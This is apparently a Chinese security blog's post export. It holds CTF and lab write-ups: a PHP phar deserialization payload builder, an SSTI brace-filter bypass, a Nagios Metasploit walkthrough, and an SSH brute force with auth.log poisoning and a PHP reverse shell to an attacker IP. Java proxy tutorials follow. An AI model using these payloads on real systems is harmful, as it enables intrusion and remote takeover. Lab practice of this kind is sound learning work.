class="keyword">array</span>($file);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line">@unlink(<span class="string">&quot;5.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;5.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub;</span></span><br><span class="line"></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义的meta-data存入manifest  //如果我们是要写phar🐎就用下面的，不然就用上面的setMeatadata</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.php&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后用burp上传，删除的时候读取文件即可：</p>
<p><img src="mage-20201029161114167.png" alt="image-20201029161114167"></p>
]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>太湖杯easyweb</title>
    <url>/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/</url>
    <content><![CDATA[<p>感觉太湖杯的题目都挺难的..这次自己制作出来一道题，是一道SSTI，做的时候一开始还以为是nodejs进行命令执行什么的</p>
<h1 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h1><p>这道题的难点主要是过滤掉了花括号，和双引号等。</p>
<h1 id="做题思路"><a href="#做题思路" class="headerlink" title="做题思路"></a>做题思路</h1><p>这道题初看就感觉是一道SSTI，但是刚开始的时候被花括号卡住了，搞得我以为是是其他题目，结果相当想到A1CTF独角兽那道题目，才有了思路，首先，我们可以确定的是，我们输入一些花里胡哨的东西会被转换为标准的字符串输出，如图：</p>
<p><img src="image-20201107195218392.png" alt="image-20201107195218392"></p>
<p>于是我联想到可以通过输入类似的花括号的utf8编码下的字符串进行绕过：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/U+FE5C</span><br></pre></td></tr></table></figure>

<p>其中这一行</p>
<table>
<thead>
<tr>
<th>UTF-8 Encoding:</th>
<th><code>0xEF 0xB9 0x9C</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>我们将0x修改为百分号即可</p>
<p><img src="image-20201107195633976.png" alt="image-20201107195633976"></p>
<p>之后就是正常的SSTI了，我们将不需要引号的payload往上上一甩就行了</p>
<p><img src="image-20201107195717338.png" alt="image-20201107195717338"></p>
<h1 id="事后"><a href="#事后" class="headerlink" title="事后"></a>事后</h1><p>事后发现其实还可以利用这种方式进行命令执行：</p>
<p><img src="image-20201107214148115.png" alt="image-20201107214148115"></p>
]]></content>
      <tags>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>Nagios渗透</title>
    <url>/2020/11/08/Nagios%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h1><p>经典NMAP</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p <span class="number">0</span>-<span class="number">65535</span> <span class="number">172</span>.<span class="number">192</span>.<span class="number">168</span>.<span class="number">235</span>.<span class="number">135</span></span><br></pre></td></tr></table></figure>

<p>drib</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">dirb http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">29</span>.<span class="number">128</span>/</span><br></pre></td></tr></table></figure>



<p>Nmap的结果如下：</p>
<p><img src="image-20201108194244662.png" alt="image-20201108194244662"></p>
<p>而dirb的结果：</p>
<p><img src="image-20201108194339973.png" alt="image-20201108194339973"></p>
<p>感觉有点鸡肋啊..dirb的结果</p>
<h1 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h1><p>WTM直接用exp库</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">searchsploit nagios</span><br></pre></td></tr></table></figure>



<p>msfconsole</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">search nagios</span><br></pre></td></tr></table></figure>

<p>之后使用show options查看我们需要填写什么</p>
<p>查看还需要设置的选项 show options，为YES且空的就是还需要我们设置的。 可以看到下图中RHOST参数还未设置内容</p>
<p><img src="1089831-20170102213249769-373635510.png" alt="img"></p>
<p>发现这个需要设置密码，于是尝试测试默认密码登陆NagiosXI，在该文章中得到账号为NagiosAdmin</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;ywnz.com&#x2F;linuxyffq&#x2F;6587.html</span><br></pre></td></tr></table></figure>

<p>密码为admin</p>
<p>这里讲一下msfconsole怎么用的..</p>
<h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><p>首先search 漏洞</p>
<p>show options 可以查看有什么条件我们还没有设置</p>
<p>再之后设置rhost和lhost，其中rhost为被攻击的机子</p>
<p><strong>lhost为攻击机，也就是我们的kali</strong></p>
<p>之后直接run，发现失败</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">] Exploit aborted due to failure: no-access: Authentication failed. Please provide a valid username and password.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>于是把我们刚刚得到的password填写上去admin</p>
<p>得到run之后执行shell，whoami查看权限就是root了</p>
]]></content>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>Java动态代理再当前的Java代码中几乎随处可见，因为它既可以获取Java静态代理的可拓展性，并且它也可以让我们的代码变得并不繁琐，除此之外，正是由于Java的动态代理原理是反射，<strong>故还会引出很多安全问题</strong>，我们要知道，Java的反射本身就是不安全的一件事（Private首先就变得毫无意义了）</p>
<p>话说回来，想要学习好动态代理，反射的学习是必不可免的，如果没有学习过我建议先学习反射，这里将一些API写罗列出来，方便没有学过反射，或者对反射并不熟悉的读者可以阅读后面的文章</p>
<h1 id="反射API"><a href="#反射API" class="headerlink" title="反射API"></a>反射API</h1><h2 id="getClass"><a href="#getClass" class="headerlink" title="getClass"></a>getClass</h2><p>[一个实例对象].getClass ,将返回实例的类，我这里用如下代码进行演示：</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当前代码的输出结果为：</p>
<p><img src="image-20201110200039318.png" alt="image-20201110200039318"></p>
<p>我们可以很清楚的发现，获取了该对象</p>
<h2 id="getclass-getInterfaces"><a href="#getclass-getInterfaces" class="headerlink" title="getclass().getInterfaces()"></a>getclass().getInterfaces()</h2><p>其实我们读名字也可以很清楚的明白它的用途了，用于获取当前的继承的接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getInterfaces());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myDemo</span> <span class="keyword">implements</span> <span class="title">bark</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name = <span class="string">&quot;dasi&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> String secretName = <span class="string">&quot;wuhu&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jiao</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;jiao&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>返回结果为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[Ljava.lang.Class;@<span class="number">7f</span>31245a</span><br></pre></td></tr></table></figure>

<p>这里便得到了类的接口了，只不过这里是以流的方式进行传输</p>
<h2 id="getClass-getName"><a href="#getClass-getName" class="headerlink" title="getClass().getName()"></a>getClass().getName()</h2><p>这样的也很简单理解，我们即使getClass了，程序却不知道它的名字，程序只知道是一个类，故我们使用getName即可得到当前实例的类的名字（String形式）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        myDemo wdnmd = <span class="keyword">new</span> myDemo();</span><br><span class="line"><span class="comment">//        System.out.println(myDemo);</span></span><br><span class="line">        System.out.println(wdnmd.getClass().getName());</span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure>

<p>好像写一个动态代理也就用到了这些，嘛，继续往下吧</p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><h2 id="2-1-接口"><a href="#2-1-接口" class="headerlink" title="2.1 接口"></a>2.1 接口</h2><p>首先和静态代理是一样的，我们也需要构筑一个接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同样的，业务实体是不可避免的</p>
<h2 id="2-2实体类："><a href="#2-2实体类：" class="headerlink" title="2.2实体类："></a>2.2实体类：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImp</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;增添了一个新用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;删除了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;更新了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;查询了一个用户&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而代理类，通过动态代理我们可以直接的生成，取消繁琐的操作</p>
<p>如果用静态代理，我们的代理是这样的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> myProxy2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;add&quot;</span>);</span><br><span class="line">        userServiceImp.add();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;删除&quot;</span>);</span><br><span class="line">        userServiceImp.delete();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;更新&quot;</span>);</span><br><span class="line">        userServiceImp.update();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        log(<span class="string">&quot;查询&quot;</span>);</span><br><span class="line">        userServiceImp.query();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]执行了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>而使用动态代理之后：</p>
<h2 id="2-3代理类"><a href="#2-3代理类" class="headerlink" title="2.3代理类"></a>2.3代理类</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> myProxy2.UserServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ProxyInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserServiceImp userServiceImp;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    IOC，让用户自定义需要什么接口来决定代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserServiceImp</span><span class="params">(UserServiceImp userServiceImp)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userServiceImp = userServiceImp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    生成代理类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(<span class="keyword">this</span>.getClass().getClassLoader(),</span><br><span class="line">                userServiceImp.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//    必须重写的接口，并返回接口</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"></span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现不再需要一个一个套模板往上写了，如果我们需要增添新功能，只需要这样做：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">//    必须重写的接口，并返回接口</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        log(method.getName());</span><br><span class="line">        Object result = method.invoke(userServiceImp, args);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[DEBUG]使用了&quot;</span>+name+<span class="string">&quot;方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>虽然我们前面去写生成一个的代码量看似很大，但是实际上这段代码是一个工具用的代码，<strong>是写死的。</strong>业务代码相当的端，从几十行骤减到十来行，并且我们的代理类不会随着工程的变大而变大，我们通过反射之后获取了类的方法</p>
<p>而源码当中，invoke方法实际上也是通过setAccessible来实现的</p>
<p><img src="image-20201110203729995.png" alt="image-20201110203729995"></p>
]]></content>
  </entry>
  <entry>
    <title>Potato和Tomato渗透</title>
    <url>/2020/11/08/Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="Potato渗透"><a href="#Potato渗透" class="headerlink" title="Potato渗透"></a>Potato渗透</h1><p>也是经典的dirb和nmap扫一波</p>
<p>nmap的结果</p>
<p><img src="image-20201108210135725.png" alt="image-20201108210135725"></p>
<p>dirb的结果</p>
<p><img src="image-20201108210207483.png" alt="image-20201108210207483"></p>
<p>也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥都没有，只能通过hypdra进行爆破咯，呃，账号密码都不知道，只能试试看了</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">hydra  192.168.1.113 ssh -s 7120  -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f</span><br></pre></td></tr></table></figure>



<p>登陆上之后查看uname -a 查看能不能提权</p>
<p>看见内核为ubuntu3.多，这种老版本一般可以直接提，尝试搜索</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">potato@ubuntu:/tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>searchsploit Ubuntu 3.13.0</p>
<p><img src="image-20201109103119279.png" alt="image-20201109103119279"></p>
<p>利用-p指令找到存放位置，之后我们就可以直接拿下exp了，再上传到靶机的tmp目录下（因为tmp目录大部分情况下是777权限</p>
<p><img src="image-20201109103447331.png" alt="image-20201109103447331"></p>
<p>成功拿下！</p>
<h1 id="Tomato渗透"><a href="#Tomato渗透" class="headerlink" title="Tomato渗透"></a>Tomato渗透</h1><p>首先经典drib和nmap扫一波</p>
<p><img src="image-20201109103819079.png" alt="image-20201109103819079"></p>
<p>nmap：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p 0-65535</span><br></pre></td></tr></table></figure>

<p><img src="Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/image-20201109104128465.png" alt="image-20201109104128465"></p>
<p>发现8888端口和21，开了其他tcp和ssh的端口,但是都没法用，在info.php下发现文件包含</p>
<p><img src="image-20201109110118801.png" alt="image-20201109110118801"></p>
<p>尝试包含了一下etc/passwd就卡住了，不知道该怎么做。。</p>
<hr>
<p>这里记录下各个log的文件</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">9)/var/run/utmp 记录着现在登录的用户;</span><br><span class="line">10)/var/log/lastlog 记录每个用户最后的登录信息;</span><br><span class="line">11)/var/log/btmp 记录错误的登录尝试;</span><br><span class="line">12)/var/log/dmesg内核日志;</span><br><span class="line">13)/var/log/cpus CPU的处理信息；</span><br><span class="line">14)/var/log/syslog 事件记录监控程序日志；</span><br><span class="line">15)/var/log/auth.log 用户认证日志；</span><br><span class="line">16)/var/log/daemon.log 系统进程日志；</span><br><span class="line">17)/var/log/mail.err 邮件错误信息；</span><br><span class="line"></span><br><span class="line">18)/var/log/mail.info 邮件信息；</span><br><span class="line"></span><br><span class="line">19)/var/log/mail.warn 邮件警告信息；</span><br><span class="line">20)/var/log/daemon.log 系统监控程序产生的信息;</span><br><span class="line">21)/var/log/kern 内核产生的信息;</span><br><span class="line">22)/var/log/lpr   行打印机假脱机系统产生的信息;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>根据大佬的payload，其实我们可以知道，在当前环境下我们可以控制的log文件只有auth.log,因为只有个这个日志我们可以操作，比如我们写入一句话，再进行包含的话，不就是执行了命令了吗（<strong>这个思路真的骚</strong></p>
<p>所以我们马上操作一波，这里我用xshell脸上·的</p>
<p><img src="image-20201109113724842.png" alt="image-20201109113724842"></p>
<p>马上执行命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls</span><br></pre></td></tr></table></figure>

<p><img src="image-20201109113800161.png" alt="image-20201109113800161"></p>
<p>再之后为了能够传脚本啥的啊，我们执行一波反弹shell：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>urlencode一下</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span><br></pre></td></tr></table></figure>

<p>弹到自己本机上即可。</p>
<p><img src="image-20201109113953687.png" alt="image-20201109113953687"></p>
<p>接下来我们求一个交互式的shell，发现python3可以用，所以接下来用Python打开一个交互式的shell</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>之后uname -a 看内核，exp一冲就完事了</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">grep -nr &quot;flag&#123;&quot; / 2&gt;/dev/null   我他妈直接一把梭</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>静态代理</title>
    <url>/2020/11/09/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<p>好久没用了都有点忘了，现在捡起来学一下，之后还有用</p>
<h1 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h1><h2 id="结合出租房子理解"><a href="#结合出租房子理解" class="headerlink" title="结合出租房子理解"></a>结合出租房子理解</h2><p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214003006.png" alt="image-20201109214003006"></p>
<p>通过图示，我们分析一个例子：</p>
<ul>
<li>客户需要租一个房子</li>
<li>房东需要租出房子</li>
</ul>
<p>这个时候两者之间的合同很纯粹，如果两者认识，就不需要中介，直接对接把房子租出去就很简单很快了对吧？但是现实往往不是这样，更可能的是如下情况：</p>
<ul>
<li>房东和客户互不相识，需要签订各种合同保证对方不会后悔</li>
<li>一个客户肯定不会只看房子，他需要看多个房子来选择自己心仪的房子</li>
<li>房东不可能时时刻刻都守着房子，等一个一个的客户上门来看</li>
</ul>
<p>在这种情况下，用户的需求和房东的客户都相当不纯粹了，需要经过很多步骤才可以转换到位</p>
<p><img src="%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/image-20201109214714721.png" alt="image-20201109214714721"></p>
<p>在现实生活中，正是由于这种情况的出现，所以出现了房屋中介，解决各种客户的情况，由房屋中介来给客户们解决各种问题，经过中介处理，双方的情况又变得纯粹了起来，而繁琐的事情交给中介来处理即可</p>
<p><img src="image-20201109214848811.png" alt="image-20201109214848811"></p>
<p>而代码一样如此，这种情况的出现几乎处处可见，比如我们可能需要处理数据库，中间需要对数据进行各种处理，这种情况就和上面的合同一样。</p>
<p>话说回来，我们如何处理租房子的情况呢？这里我写了一小段代码来做出范例：</p>
<p>我们可以将这个事情抽象成四个part：</p>
<ul>
<li>出租房子这件事情</li>
<li>谁出租？ 房东</li>
<li>谁要房子？ 客户</li>
<li>谁来处理复杂情况？ 中介</li>
</ul>
<p>分析完之后我们可以着手于代码</p>
<p>出租房子这件事情：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Rent</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>房东:</p>
